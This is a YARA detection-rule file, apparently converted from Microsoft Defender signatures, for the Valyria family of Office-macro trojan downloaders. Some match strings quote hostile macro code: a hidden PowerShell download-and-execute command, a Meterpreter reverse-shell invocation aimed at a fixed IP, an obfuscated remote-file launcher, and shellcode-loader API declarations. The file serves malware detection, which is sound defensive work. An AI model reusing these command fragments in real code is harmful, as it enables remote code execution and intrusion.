rule TrojanDownloader_O97M_Valyria_GG_2147744580_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Valyria.GG!MTB"
        threat_id = "2147744580"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Valyria"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "42"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {41 00 72 00 72 00 61 00 79 00 28 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00 [0-5] 2c 00}  //weight: 10, accuracy: Low
        $x_10_2 = {41 72 72 61 79 28 [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c [0-5] 2c}  //weight: 10, accuracy: Low
        $x_1_3 = {46 00 75 00 6e 00 63 00 74 00 69 00 6f 00 6e 00 20 00 43 00 72 00 65 00 61 00 74 00 65 00 54 00 68 00 72 00 65 00 61 00 64 00 20 00 4c 00 69 00 62 00 20 00 22 00 6b 00 65 00 72 00 6e 00 65 00 6c 00 33 00 32 00 22 00 20 00 41 00 6c 00 69 00 61 00 73 00 20 00 22 00 [0-15] 22 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 43 72 65 61 74 65 54 68 72 65 61 64 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 [0-15] 22}  //weight: 1, accuracy: Low
        $x_1_5 = {46 00 75 00 6e 00 63 00 74 00 69 00 6f 00 6e 00 20 00 56 00 69 00 72 00 74 00 75 00 61 00 6c 00 41 00 6c 00 6c 00 6f 00 63 00 20 00 4c 00 69 00 62 00 20 00 22 00 6b 00 65 00 72 00 6e 00 65 00 6c 00 33 00 32 00 22 00 20 00 41 00 6c 00 69 00 61 00 73 00 20 00 22 00 [0-15] 22 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 75 6e 63 74 69 6f 6e 20 56 69 72 74 75 61 6c 41 6c 6c 6f 63 20 4c 69 62 20 22 6b 65 72 6e 65 6c 33 32 22 20 41 6c 69 61 73 20 22 [0-15] 22}  //weight: 1, accuracy: Low
        $x_1_7 = "Private Declare PtrSafe Function CreateThread Lib \"kernel32\"" ascii //weight: 1
        $x_1_8 = "Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\"" ascii //weight: 1
        $x_10_9 = {28 00 30 00 2c 00 20 00 55 00 42 00 6f 00 75 00 6e 00 64 00 28 00 [0-15] 29 00 2c 00 20 00 26 00 48 00 31 00 30 00 30 00 30 00 2c 00 20 00 26 00 48 00 34 00 30 00 29 00}  //weight: 10, accuracy: Low
        $x_10_10 = {28 30 2c 20 55 42 6f 75 6e 64 28 [0-15] 29 2c 20 26 48 31 30 30 30 2c 20 26 48 34 30 29}  //weight: 10, accuracy: Low
        $x_10_11 = {28 00 30 00 2c 00 20 00 30 00 2c 00 20 00 [0-15] 2c 00 20 00 30 00 2c 00 20 00 30 00 2c 00 20 00 30 00 29 00}  //weight: 10, accuracy: Low
        $x_10_12 = {28 30 2c 20 30 2c 20 [0-15] 2c 20 30 2c 20 30 2c 20 30 29}  //weight: 10, accuracy: Low
        $x_10_13 = {46 00 6f 00 72 00 20 00 [0-15] 20 00 3d 00 20 00 4c 00 42 00 6f 00 75 00 6e 00 64 00 28 00 [0-15] 29 00 20 00 54 00 6f 00 20 00 55 00 42 00 6f 00 75 00 6e 00 64 00 28 00 [0-15] 29 00}  //weight: 10, accuracy: Low
        $x_10_14 = {46 6f 72 20 [0-15] 20 3d 20 4c 42 6f 75 6e 64 28 [0-15] 29 20 54 6f 20 55 42 6f 75 6e 64 28 [0-15] 29}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_10_*) and 2 of ($x_1_*))) or
            ((5 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Valyria_H_2147744722_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Valyria.H!MTB"
        threat_id = "2147744722"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Valyria"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"powershell.exe   . ( ([sTrINg]$VeRBOSePRefeREnCe)[1,3]+'x'-JOIn'')" ascii //weight: 1
        $x_1_2 = {28 28 27 28 27 2b [0-15] 53 27 2b 27 74 [0-15] 2b [0-15] 61 72 27 2b 27 74 27 2b 27 2d 50 72 6f 63 65 73 27 2b 27 [0-64] 73 [0-80] 68 74 74 27 2b 27 70 73 3a 2f 2f 66 69 27 2b 27 6c 65 27 2b 27 [0-64] 2e 63 [0-64] 61 74 [0-64] 62 6f 78 27 2b 27 2e 27 2b 27 6d [0-64] 6f 65 2f [0-64] 75 35 74 27 2b 27 [0-64] 37 [0-64] 6e 27 2b 27 6c 2e 70 27 2b 27 6e 27 2b 27 67 27 2b 27 [0-64] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 52 65 70 6c 41 63 27 2b 27 45 27 2b 27 28 28 5b 63 48 61 27 2b 27 72 5d 35 35 2b 5b 63 48 61 72 27 2b 27 5d 27 2b 27 38 33 2b 5b 63 27 2b 27 48 27 2b 27 61 27 2b 27 72 5d 39 30 29 2c 5b 27 2b 27 73 54 52 27 2b 27 69 6e 27 2b 27 67 5d 5b 63 48 61 72 27 2b 27 5d 27 2b 27 33 27 2b 27 34 27 2b 27 29 20 [0-64] 20 26 20 28 20 [0-80] 29 27 29 2e 52 45 50 4c 61 43 45 28 27 [0-15] 27 2c 5b 73 54 52 49 6e 47 5d 5b 43 68 61 72 5d 31 32 34 29 2e 52 45 50 4c 61 43 45 28 27 [0-15] 27 2c 5b 73 54 52 49 6e 47 5d 5b 43 68 61 72 5d 33 36 29 2e 52 45 50 4c 61 43 45 28 28 5b 43 68 61 72 5d 31 30 35 2b 5b 43 68 61 72 5d 37 35 2b 5b 43 68 61 72 5d 37 38 29 2c 5b 73 54 52 49 6e 47 5d 5b 43 68 61 72 5d 33 39 29 20 29 20 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Valyria_I_2147789299_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Valyria.I"
        threat_id = "2147789299"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Valyria"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 20 4c 69 62 20 22 73 68 65 6c 6c 33 32 22 20 41 6c 69 61 73 20 22 53 68 65 6c 6c 45 78 65 63 75 74 65 41 22}  //weight: 1, accuracy: Low
        $x_1_2 = {28 4d 69 64 28 [0-16] 2c 20 28 31 20 2a 20 33 20 2d 20 32 29 2c 20 4c 65 6e 28 [0-16] 29 20 2d 20 28 37 20 2a 20 31 20 2d 20 35 29 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Valyria_RA_2147823673_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Valyria.RA!MTB"
        threat_id = "2147823673"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Valyria"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "transfvw585zbhr.sh/gvw585zbht/spmvw585zbhl6" ascii //weight: 1
        $x_1_2 = "bfss21appdbfss21atbfss21a\\robfss21aming\\beros.lnk" ascii //weight: 1
        $x_1_3 = "mnotepad.exe" ascii //weight: 1
        $x_1_4 = "godknows" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Valyria_RHAA_2147915708_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Valyria.RHAA!MTB"
        threat_id = "2147915708"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Valyria"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(\"setobjshell=wscript.createobject(\"\"wscript.shell\"\")\")" ascii //weight: 1
        $x_1_2 = "(\"command=\"\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe-windowstylehidden-nop-noexit-ciex((new-objectnet.webclient)" ascii //weight: 1
        $x_1_3 = "downloadstring('https://raw.githubusercontent.com/enigma0x3/generate-macro/master/generate-macro.ps1'))" ascii //weight: 1
        $x_1_4 = "invoke-shellcode-payloadwindows/meterpreter/reverse_https-lhost172.19.240.124-lport1234-force\"\"\")" ascii //weight: 1
        $x_1_5 = "writeline(\"objshell.runcommand,0\")" ascii //weight: 1
        $x_1_6 = "wscriptc:\\users\\public\\config.vbs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Valyria_AMA_2147923545_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Valyria.AMA!MTB"
        threat_id = "2147923545"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Valyria"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_6_1 = "Set jbxinstr = CreateObject(\"Scripting.FileSystemObject\").CreateTextFile(\"Z:\\syscalls\\0_\" & Int(Rnd * 10000 + 10000) & \".vba.csv\", True, True)" ascii //weight: 6
        $x_2_2 = "Set jbxXmlNodeOb = jbxXmlOb.createElement(\"b64\")" ascii //weight: 2
        $x_1_3 = "jbxXmlNodeOb.dataType = \"bin.base64\"" ascii //weight: 1
        $x_1_4 = "JbxB64Encode = Replace(jbxXmlNodeOb.Text, vbLf, \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

